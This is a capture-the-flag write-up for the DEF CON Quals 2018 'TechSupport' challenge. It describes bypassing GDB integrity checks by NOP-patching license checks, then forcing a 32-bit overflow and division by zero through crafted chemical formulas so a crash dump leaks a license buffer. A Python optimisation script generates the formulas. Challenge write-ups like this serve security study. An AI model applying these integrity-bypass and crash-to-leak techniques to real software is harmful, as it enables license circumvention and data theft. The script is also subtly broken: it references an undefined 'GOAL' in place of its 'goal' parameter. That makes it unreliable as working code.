TechSupport  
-----------  
When connecting to the remote server, we get something like:

```  
Thank you for contacting Chemisoft technical support.  
My name is Elen, how can I help you?  
foo  
Is your keyboard properly connected to the computer? yes  
Did you experience similar problems with other software as well? no  
Does the program persists when you are not looking at it? yes  
I heard sometimes bugs are caused by the presence of floppy drives. Do you
have one? no

Alright then - it looks like we ruled out the most common problems.  
So, let me now look at the program for you.  
I am going to use port 3456. Everything ready on your side? yes  
```

Then we get an incoming GDB connection on 3456. We set up a GDB server that
runs the provided `mcalc` binary (a simple molecular weight calculator). It
complains about the invalid license, and the challenge server performs
integrity checks via GDB to protect from patching. Those can be bypassed
either by writing a fake GDB server, or by patching the binary in a way that
is not detected (most of the time):

```  
004016fe  mov     dword [rbp-0x30 {var_38}], 0xabc8eef  
00401705  mov     dword [rbp-0x2c {var_34}], 0xb096bff4  
0040170c  mov     dword [rbp-0x28 {var_30}], 0xe0c54799  
00401713  mov     dword [rbp-0x24 {var_2c}], 0x68cbc732  
0040171a  nop  
(...)  
00401721  nop  
```

Now the helpdesk says the program worked fine. We patch in a `int 3` at
`0x401abb` to make it crash, it says it'll try to reproduce the bug. So we
need to make the original binary crash through the input formula only.

It is possible to force a division by zero. `main` calculates the total weight
as sum of every count by its atom's weight, and if greater than 1000 it calls
the sub at `0x40190b` to print stats about the main element. In the sub, the
total weight (re-calculated) is used as denominator. Because of how the
element-count mapping array in `main` is populated, if the same element is
repeated multiple times, `main` will sum all occurrences, while the sub's
total will only use the rightmost occurrence. So if we find a chemical formula
that overflows the 32-bit sum to zero, then prepend an atom (with weight >
1000) that is already in the formula, we get a weight greater than 1000 in
`main` but equal to zero in the sub, causing a division by zero. Such a
formula can be found as a solution to an LP problem (minimizing used atoms, as
there is a length limit).

Once the remote reproduction crashes, too, the helpdesk prints out the
differences between the two states (our crash and reproduced crash). If a
register is a valid memory address, it shows a dereferenced qword. So plan is:
control a remote register at the crash to dereference the valid license buffer
(which is reasonably the flag).

Before calling the sub, `ecx` contains the total weight as calculated in
`main`, and it is not touched by the sub before the division. We build a
formula so that the right portion overflows to zero (to trigger the crash),
and the left portion uses only atoms already present in the right portion and
sums to the address we want to read (to set `ecx`). License is 16 bytes at
`0x6033d0`, so two crafted formulas later, we have the flag.

Script to generate the formulas:

```python  
#!/usr/bin/python3

import struct  
import pulp

with open('mcalc', 'rb') as f:  
   f.seek(0x30a0)  
   raw_atoms = f.read(8 * 100)

atoms = []  
for i in range(0, len(raw_atoms), 8):  
   raw_atom = raw_atoms[i:i+8]  
   atom = (raw_atom[:4].strip(b'\x00').decode('ascii'), struct.unpack('<I',
raw_atom[4:])[0])  
   atoms.append(atom)

def formula(goal):  
   prob = pulp.LpProblem('Formula Left', pulp.LpMinimize)  
   cnt = pulp.LpVariable.dicts('cnt', range(len(atoms)), lowBound=0,
upBound=999, cat='Integer')  
   used = pulp.LpVariable.dicts('used', range(len(atoms)), cat='Binary')  
   prob += sum(used)  
   prob += sum(atoms[i][1] * cnt[i] for i in range(len(atoms))) == GOAL  
   prob += sum(cnt) > 0  
   for i in range(len(atoms)):  
       prob += used[i] <= cnt[i], 'C_{}_upper'.format(i)  
       prob += cnt[i] <= 10000*used[i], 'C_{}_lower'.format(i)

   prob.solve()

   formula = ''  
   first_part_atoms = []  
   for i in range(len(atoms)):  
       value = int(pulp.value(cnt[i]))  
       if value > 0:  
           formula += '{}{}'.format(atoms[i][0], value if value > 1 else '')  
           first_part_atoms.append(i)

   prob = pulp.LpProblem('Formula Right', pulp.LpMinimize)  
   cnt = pulp.LpVariable.dicts('cnt', range(len(atoms)), lowBound=0,
upBound=999, cat='Integer')  
   used = pulp.LpVariable.dicts('used', range(len(atoms)), cat='Binary')  
   prob += sum(used)  
   prob += sum(atoms[i][1] * cnt[i] for i in range(len(atoms))) == 2**32  
   prob += sum(cnt) > 0  
   for i in range(len(atoms)):  
       prob += used[i] <= cnt[i], 'C_{}_upper'.format(i)  
       prob += cnt[i] <= 10000*used[i], 'C_{}_lower'.format(i)  
   for i in first_part_atoms:  
       prob += used[i] == True

   prob.solve()

   for i in range(len(atoms)):  
       value = int(pulp.value(cnt[i]))  
       if value > 0:  
           formula += '{}{}'.format(atoms[i][0], value if value > 1 else '')  
   return formula

LICENSE_ADDR = 0x6033d0  
LICENSE_QWORDS = 2

for i in range(LICENSE_QWORDS):  
   goal = LICENSE_ADDR + 8*i  
   print('0x{:x}: {}'.format(goal, formula(goal)))  
```  

Original writeup
(https://mhackeroni.it/archive/2018/05/20/defconctfquals-2018-all-
writeups.html#techsupport).